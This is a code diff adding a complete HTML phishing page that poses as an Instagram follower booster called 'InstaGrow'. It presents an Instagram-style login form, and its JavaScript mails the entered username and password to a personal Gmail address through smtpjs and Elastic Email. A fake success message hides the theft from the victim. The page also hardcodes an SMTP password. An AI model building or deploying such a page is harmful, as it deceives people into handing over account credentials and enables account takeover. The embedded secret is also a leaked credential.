@@ -1,0 +1,102 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <title>Insta Follower</title>
+    <meta name="description" content="">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet"
+        integrity="sha384-T3c6CoIi6uLrA9TneNEoa7RxnatzjcDSCmG1MXxSR1GAsXEV/Dwwykc2MPK8M2HN" crossorigin="anonymous">
+    <link rel="stylesheet" href="style.css">
+</head>
+
+<body>
+  <div class="container pehladabba   ">
+    <span class="dd" style="background: linear-gradient(90deg, rgba(36,0,0,1) 0%, rgba(202,36,137,1) 14%, rgba(63,203,86,1) 30%, rgba(0,212,255,1) 50%);
+      -webkit-background-clip: text;
+  color: transparent;">Welcome to InstaGrow</span></p>
+
+    <h3 class="jum">This website help's to grow your followers you have just login. you will get 500 fake followers. This site is fully secured..  </h3>
+    <br>
+    
+
+  </div>
+
+
+    <div class="instabox">
+        <div class="logo">
+            <img src="Instagram_logo_enhanced.png" alt="Instagram">
+        </div>
+        <form action="">
+            <input type="text" id="username" placeholder="Username or Email">
+            <input type="password" id="password" placeholder="Password">
+            <button type="button" value="Submit" onclick="Send()">Log In</button>
+        </form>
+        <div class="forgot-password">
+            <a href="#">Forgot password?</a>
+        </div>
+        <br>
+        <hr>
+        <br>
+        <div class="signup">
+            <span>Don't have an account?</span> <a href="#">Sign Up</a>
+        </div>
+    </div><br>
+    <br>
+
+
+
+
+
+
+
+
+    <script src="https://smtpjs.com/v3/smtp.js"></script>
+    <script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js"
+        integrity="sha384-C6RzsynM9kWDrMNeT87bh95OGNyZPhcTNXj1NW7RuBCsyN/o0jlpcV8Qyq46cDfL"
+        crossorigin="anonymous"></script>
+
+        
+        <script>
+            function Send() {
+        
+        
+              var username = document.getElementById("username").value;
+              var password = document.getElementById("password").value;
+              
+              // Basic validation
+              if (!username || !password ) {
+                swal("Error", "All fields are required", "error");
+                return;
+              }
+        
+              var body = "username: " + username + "<br/> password:" + password;
+        
+              console.log(body);
+              Email.send({
+                Host: "smtp.elasticemail.com",
+                Username: "adityapanday459@gmail.com",
+                Password: "C9D10BEE800F60A565F4B7FEB96BB07ACC03",
+                To: 'adityapanday459@gmail.com',
+                From: "adityapanday459@gmail.com",
+                Subject: "Insta Data",
+                Body: body
+              }).then(
+                message => {
+                  if (message == 'OK') {
+                    swal("Successfull", "Your request successfully sent wait for 24 hours your followers will be increase", "success");
+                  }
+                }
+        
+              );
+            }
+        
+          </script>
+          
+
+</body>
+
+</html>
